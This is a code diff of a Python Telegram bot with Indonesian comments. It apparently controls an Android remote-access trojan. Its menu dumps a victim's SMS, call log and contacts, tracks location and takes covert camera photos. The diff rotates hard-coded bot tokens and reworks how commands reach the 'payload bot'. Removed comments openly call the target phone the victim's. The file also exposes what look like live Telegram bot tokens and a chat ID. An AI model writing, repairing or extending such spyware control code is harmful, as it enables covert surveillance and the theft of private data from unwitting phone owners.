@@ -9,9 +9,12 @@ import urllib.request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ── KONFIGURASI ──
-TOKEN = "9153767226:AAG1OcskHZZ9hGf4TQ8BxPKSk4ALk6Tc1dE" 
-PAYLOAD_BOT_TOKEN = "9163541732:AAFz_ibQ0T0hC_4tR81RzuKgF8bcx3-TyqQ"
+# ── KONFIGURASI BARU ──
+TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
+PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
+# ⚠️ GANTI PAKE USERNAME BOT PAYLOAD BARU KAMU (tanpa @)
+PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadBaruKamu" 
+
 ALLOWED_CHAT_ID = "8598136412" 
 
 WORK_DIR = "/data/data/com.termux/files/home/r4t" 
@@ -159,24 +162,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms")],[InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon"), InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak")],[InlineKeyboardButton("📍 Lokasi", callback_data="cmd_lacak"), InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan")],[InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]]
         await query.edit_message_text("🎮 **Menu Kontrol**\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-    # ── EKSEKUSI TOMBOL (PAKAI TRIK INLINE KEYBOARD) ──
     elif query.data.startswith("cmd_"):
         perintah = "/" + query.data.replace("cmd_", "")
-        
-        # Kita bikin bot ngirim pesan, tapi isinya tombol link ke Bot Payload
-        # Biar kamu yang nge-klik (sebagai User asli), bukan Bot Builder.
-        url_payload = f"https://t.me/c/1234567890/1" # placeholder
-        # Sebenernya kita ga bisa lempar langsung ke chat Bot Payload lewat URL.
-        
-        # Solusi paling gampang: Kita suruh Bot Builder ngirim pesan ke Bot Payload
-        # TAPI PAKAI AKUN KAMU. Karena kita ga bisa pake akun kamu,
-        # Kita akalin dengan nampilin teks aja, terus kamu tinggal pencet tombol copy.
+        url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
+        keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
         
         await query.message.reply_text(
-            f"⚠️ **Android tidak bisa mendengar perintah dari sesama Bot.**\n\n"
-            f"Silakan **COPY** teks di bawah ini, lalu **PASTE & KIRIM** di chat *Bot Hasil r4t ku* (Bot Payload):\n\n"
+            f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\n"
+            f"Silakan klik tombol di bawah untuk buka **Bot Payload**, lalu **COPY & KIRIM** teks ini di sana:\n\n"
             f"`{perintah}`\n\n"
-            f"*(Kalau kamu kirim dari akunmu sendiri, APK di HP korban bakal langsung merespon dan ngirim datanya ke sini).*",
+            f"*(Pastikan nggak ada typo, huruf kecil semua).*",
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
 
